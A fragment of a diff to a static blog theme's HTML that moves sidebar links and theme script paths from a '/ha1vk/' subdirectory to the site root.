       <div class="site-state-item site-state-categories">
-            <a href="/ha1vk/categories/">
+            <a href="/categories/">
           
         <span class="site-state-item-count">4</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
-            <a href="/ha1vk/tags/">
+            <a href="/tags/">
           
         <span class="site-state-item-count">145</span>
         <span class="site-state-item-name">标签</span></a>
@@ -509,30 +509,30 @@
   </div>
 
   
-  <script src="/ha1vk/lib/anime.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.min.js"></script>
-  <script src="/ha1vk/lib/velocity/velocity.ui.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
 
-<script src="/ha1vk/js/utils.js"></script>
+<script src="/js/utils.js"></script>
 
-<script src="/ha1vk/js/motion.js"></script>
-
-
-<script src="/ha1vk/js/schemes/muse.js"></script>
+<script src="/js/motion.js"></script>
 
 
-<script src="/ha1vk/js/next-boot.js"></script>
+<script src="/js/schemes/muse.js"></script>
 
 
-
-
-  
+<script src="/js/next-boot.js"></script>
 
 
 
 
   
-<script src="/ha1vk/js/local-search.js"></script>
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
 
 
 
